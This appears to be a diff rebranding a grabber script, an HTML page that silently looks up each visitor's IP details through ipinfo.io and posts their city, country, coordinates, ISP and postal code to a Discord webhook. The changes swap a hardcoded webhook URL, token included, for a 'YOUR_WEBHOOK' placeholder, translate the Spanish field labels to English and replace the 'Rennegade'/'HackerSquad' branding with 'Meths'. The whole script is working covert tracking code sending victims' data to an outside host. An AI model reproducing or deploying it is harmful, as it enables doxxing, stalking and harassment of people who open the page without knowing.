@@ -7,10 +7,10 @@
 	<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 	<script>
 		$.get("https://ipinfo.io", function(response) {
-			const webhook_url = "https://discord.com/api/webhooks/996640689200840754/8fdw_c29V5X9oXd4lRT85veF4TLYB0Fb2ClM6H_ch9y2BJXGxDC2HxZdiMUReVWGjJl4";
+			const webhook_url = "YOUR_WEBHOOK";
 			const main = {
-				title: "Ip Logger",
-				description: "> __Rennegade Ip Logger__",
+				title: "Meths | IP Logger",
+				description: "> IP Logger",
 				thumbnail: {
 					url: "https://cdn.discordapp.com/avatars/586435544750358540/a_36fc175d7430d6e04516474126184ed4.gif?size=2048",
 				},
@@ -26,7 +26,7 @@
 						inline: false,
 					},
 					{
-						name: "Ciudad:",
+						name: "City:",
 						value: `\`${response.city}\``,
 						inline: false,
 					},
@@ -36,32 +36,32 @@
 						inline: false
 					},
 					{
-						name: "País:",
+						name: "Country:",
 						value: `\`${response.country}\``,
 						inline: false
 					},
 					{
-						name: "Localización:",
+						name: "Long/Lat:",
 						value: `\`${response.loc}\``,
 						inline: false
 					},
 					{
-						name: "Compañia:",
+						name: "Company:",
 						value: `\`${response.org}\``,
 						inline: false
 					},
 					{
-						name: "Código postal:",
+						name: "Postal Region:",
 						value: `\`${response.postal}\``,
 						inline: false
 					},
 				],
 				footer: {
-					text: "HackerSquad Grabber"
+					text: "Meths | GET IP LOGGED"
 				},
 				author: {
-					name: "{ Rennegade }",
-					url: "https://discord.gg/fvck"
+					name: "{ Meths }",
+					url: ""
 				}
 			}
 			var xhttp = new XMLHttpRequest();
@@ -69,7 +69,7 @@
 			xhttp.open("POST", url, true);
 			xhttp.setRequestHeader('Content-Type', 'application/json');
 			xhttp.send(JSON.stringify({
-				'username': 'Ip Grabber',
+				'username': 'IP Logger',
 				'embeds': [main],
 			}));
 		}, "json");
